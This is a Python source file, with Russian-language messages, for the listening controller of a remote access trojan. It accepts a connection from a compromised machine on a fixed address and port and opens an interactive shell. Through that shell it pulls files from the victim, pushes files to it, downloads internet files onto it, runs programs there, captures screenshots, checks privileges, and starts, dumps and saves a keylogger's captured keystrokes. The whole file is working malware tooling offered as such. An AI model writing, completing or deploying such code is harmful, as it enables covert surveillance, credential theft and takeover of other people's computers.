#!/usr/bin/python
import socket
import json
import base64
import logging
import datetime

logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(message)s")


def reliable_send(data, sock, binary=False):
    try:
        if binary:
            sock.sendall(data)  
        else:
            json_data = json.dumps(data).encode()
            sock.send(json_data)
    except Exception:
        pass


def reliable_recv(sock, binary=False):
    json_data = b""
    while True:
        try:
            chunk = sock.recv(1024)
            if binary:
                return chunk  
            json_data += chunk
            return json.loads(json_data.decode())
        except ValueError:
            continue



def show_help():
    help_text = """
    Список доступных команд:
    =========================
    cd <path>           - Перейти в указанную директорию на клиенте.
    download <file>     - Скачать файл с клиента на сервер.
    upload <file>       - Загрузить файл с сервера на клиент.
    get <url>           - Загрузить файл из интернета на клиент.
    start <file>        - Запустить файл на клиенте.
    screenshot          - Сделать скриншот на клиенте и передать его на сервер.
    check               - Проверить привилегии клиента (Администратор/Пользователь).
    keylog_start        - Запустить кейлогер.
    keylog_dump         - Показать результат кейлога.
    q                   - Выйти из сеанса.
    help                - Показать эту справку.
    """

    print(help_text)


def download_file(command, target):
    file_name = command[9:].strip()
    try:
        with open(file_name, "wb") as file:
            while True:
                chunk = target.recv(1024)  
                if chunk.endswith(b"EOF"):  
                    file.write(chunk[:-3])  
                    break
                file.write(chunk)  
        print(f"[+] Файл {file_name} успешно загружен.")
    except Exception as e:
        print(f"[!!] Ошибка при загрузке файла {file_name}: {e}")



def upload_file(command, target):
    file_name = command[7:].strip()
    try:
        with open(file_name, "rb") as file:
            reliable_send(base64.b64encode(file.read()).decode(), target)
        logging.info(f"Файл {file_name} успешно отправлен")
    except FileNotFoundError:
        logging.error(f"Файл {file_name} не найден")
        reliable_send("[!!] Файл не найден", target)


def save_screenshot(target, screenshot_id):
    file_name = f"screenshot_{screenshot_id}.png"
    try:
        with open(file_name, "wb") as screen_file:
            image = reliable_recv(target)
            screen_file.write(base64.b64decode(image))
        logging.info(f"Скриншот сохранен как screenshot_{screenshot_id}.png")
    except Exception as e:
        logging.error(f"Ошибка сохранения скриншота: {e}")


def save_keylogs(logs):
    if logs.strip() and not logs.startswith("[!!]"):
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        file_name = f"keylog_{timestamp}.txt"
        try:
            with open(file_name, "w") as log_file:
                log_file.write(logs + "\n")
            logging.info(f"[+] Кейлог сохранен в файл: {file_name}")
        except Exception as e:
            logging.error(f"[!!] Ошибка при сохранении кейлогов: {e}")
    else:
        logging.warning("[!!] Кейлог пуст.")


def shell(target, ip):
    screenshot_id = 1
    try:
        while True:
            command = input(f"*Shell#~{ip}: ")
            if command == "help":
                show_help()
                continue
            else:
                reliable_send(command, target)
            if command == "q":
                logging.info("[+] Завершаем сеанс...")
                reliable_send("q", target)
                target.close()
                break
            elif command.startswith("cd"):
                response = reliable_recv(target)
                print(response)
            elif command.startswith("download"):
                download_file(command, target)
            elif command.startswith("upload"):
                upload_file(command, target)
            elif command.startswith("screenshot"):
                save_screenshot(target, screenshot_id)
                screenshot_id += 1
            elif command == "keylog_start":
                print(reliable_recv(target))
            elif command == "keylog_dump":
                try:
                    logs = reliable_recv(target)
                    save_keylogs(logs)
                except Exception as e:
                    logging.error(f"[!!] Ошибка при обработке команды keylog_dump: {e}")
            else:
                response = reliable_recv(target)
                print(response)
    except Exception as e:
        logging.error(f"[!!] Ошибка обработки клиента: {e}")
    finally:
        logging.info("[+] Клиент отключен")


def server():
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.bind(("192.168.178.67", 54321))
            s.listen(1)
            logging.info("[+] Ожидание подключения...")
            target, ip = s.accept()
            logging.info(f"[+] Подключение установлено с {ip}")
            shell(target, ip)
    except KeyboardInterrupt:
        logging.info("\n[!] Сервер остановлен вручную")
    except Exception as e:
        logging.error(f"[!!] Критическая ошибка: {e}")


if __name__ == "__main__":
    server()
